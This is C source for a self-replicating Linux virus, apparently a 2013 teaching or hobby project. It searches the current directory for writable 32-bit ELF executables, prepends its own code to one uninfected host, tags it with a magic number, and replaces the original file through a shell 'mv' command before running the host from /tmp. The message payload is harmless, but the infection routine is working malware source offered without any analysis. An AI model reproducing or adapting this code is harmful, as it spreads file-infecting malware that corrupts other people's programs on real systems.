//
//  virus.c
//
//
//  Created by Akshay Sawant on 12/7/13.
//
//

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/param.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>
#include <dirent.h>
#include <pwd.h>
#include <stdlib.h>



/*  Some global variables.  */

#define MAGIC 23588
#define PARASITE_LENGTH 9088
#define TEMP_FILE_NAME "/tmp/fileXXXXXX"
#define MAX_BUF 1024

#define FALSE 0
#define TRUE !FALSE


void infect (char *file, int hd, char *virus);
void scan (char *pwd, char *virus);
void payload ();
int file_select();


void main(int argc, char *argv[])
{
    /* Local Variables */
    int fd, len=0, tempfd;
    struct stat vparam;
    char virus[PARASITE_LENGTH];
    char pwd[200];
    char *orig_prog;
    char *tempfname;
    char *envp[] = { NULL };
    pid_t pid;
    
    
    /* Open executed file */
    fd=open(argv[0], O_RDONLY);
    if (fstat (fd, &vparam) < 0) return 1;
    
    /* Reading ourselves into memory */
    if (read(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;
    
    /* Get the Current working directory */
    if (getcwd(pwd, sizeof(pwd)) == NULL)
        return 1;
    
    /* Call the scan function with  */
    scan(pwd, virus);
    payload();
    
    if ((strcmp(argv[0], "virus")) == 0) return 1;
    if ((strcmp(argv[0], "./virus")) == 0) return 1;
    
    /* Now resume with original program */
    len = vparam.st_size - PARASITE_LENGTH;
    orig_prog = (char*) malloc(len);
    
    /* Go to position at which original program is located. CURRENTLY NOT CHECKING FOR NEW POSITION. */
    lseek(fd, PARASITE_LENGTH, SEEK_SET);
    if (read (fd, orig_prog, len) != len) return 1;
    close(fd);
    
    /* Copy original program to tempfd file in a /temp/ directory */
    tempfname = (char *)malloc(MAX_BUF);
    strncpy(tempfname, TEMP_FILE_NAME, MAX_BUF);
    tempfd = mkstemp(tempfname);
    if(tempfd < 0) return 1;
    if (write(tempfd, orig_prog, len) != len) return 1;
    
    /* Set the permissions of original program to temp file */
    fchmod(tempfd, vparam.st_mode);
    free(orig_prog);
    close(tempfd);
    
    /* Invoke the original program */
    pid = fork();
    if (pid <0) exit(1);
    if(pid ==0) exit(execve(tempfname, argv, envp));
    if(waitpid(pid, NULL, 0) != pid) exit(1);
    unlink(tempfname);
    
}

void scan (char *pwd, char *virus)
{
    /* Local Variables */
    int count = 0, i = 0, fd1, fd2, magic=0, magicpos;
    struct dirent *files;
    struct stat stat;
    DIR *dd;
    Elf32_Ehdr ehdr;
    char *filename;
    
    /* Open directory and check files */
    dd = opendir(pwd);
    files = readdir(dd);
    // count = scandir(pwd, &files, file_select, alphasort);
    
    filename = (char *)malloc(256);
    
    while((files=readdir(dd)) != NULL)
    {
        /* Get header information for this file */
        strncpy(filename, pwd, 255);
        strcat(filename, "/");
        strncat(filename, files->d_name, 255-strlen(filename));
        
        fd1 = open(filename, O_RDONLY, 0);
        if(read(fd1,&ehdr, sizeof(ehdr)) != sizeof(ehdr)) continue;
        
        if( ehdr.e_ident[0] != ELFMAG0 ||
           ehdr.e_ident[1] != ELFMAG1 ||
           ehdr.e_ident[2] != ELFMAG2 ||
           ehdr.e_ident[3] != ELFMAG3 )
            continue;
        
        if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) continue;
        if (ehdr.e_machine != EM_386) continue;
        if (ehdr.e_version != EV_CURRENT) continue;
        
        if (fstat (fd1, &stat) < 0) return 1;
        magicpos = stat.st_size - (sizeof(magic));
        
        lseek(fd1, magicpos, SEEK_SET);
        if(read(fd1, &magic, sizeof(magic)) != sizeof(magic)) continue;
        if(magic == MAGIC) continue;
        
        if(access(filename, W_OK) == 0)
        {
            fd2=open(filename, O_RDWR, 0);
            if(fd2 >= 0)
            {
                infect(filename, fd2, virus);
                close(fd2);
                break;
            }
            close(fd2);
        }
        
        close(fd1);
    }
}

void infect (char *file, int hd, char *virus)
{
    int fd, magic=MAGIC, ret;
    char *tmpfile;
    char *progbuf, *command;
    struct stat stat;
    
    tmpfile = (char *)malloc(MAX_BUF);
    strncpy(tmpfile, TEMP_FILE_NAME, MAX_BUF);
    fd=mkstemp(tmpfile);
    if(fd<0)
    {
        exit(1);
    }
    
    /* Write the virus code at the start of temp file */
    if (write(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;
    
    /* Read original file data into progbuf */
    if (fstat (hd, &stat) < 0) return 1;
    progbuf = (char*) malloc(stat.st_size);
    
    if (read (hd, progbuf, stat.st_size) != stat.st_size) return 1;
    close(hd);
    
    /* Write host to end of our temp file */
    if(write(fd, progbuf, stat.st_size) != stat.st_size) return 1;
    /* Write magic number to EOF */
    if(write(fd, &magic, sizeof(magic)) != sizeof(magic)) return 1;
    
    /* Set the permisions and ownerships on our temp file */
    if(fchown(fd, stat.st_uid, stat.st_gid) < 0) return 1;
    if(fchmod(fd, stat.st_mode) < 0) return 1;
    /* Rename tmp file overtop of original file */
    
    command = (char *)malloc(MAX_BUF + 256);
    strncpy(command, "mv ", strlen("mv "));
    strncat(command, tmpfile, strlen(tmpfile));
    strncat(command, " ", strlen(" "));
    strncat(command, file, strlen(file));
    
    if (system(command) != 0)
    {
        return 1;
    }
    
    close(fd);
}

void payload()
{
    printf("Hello! I am a simple virus!\n");
}


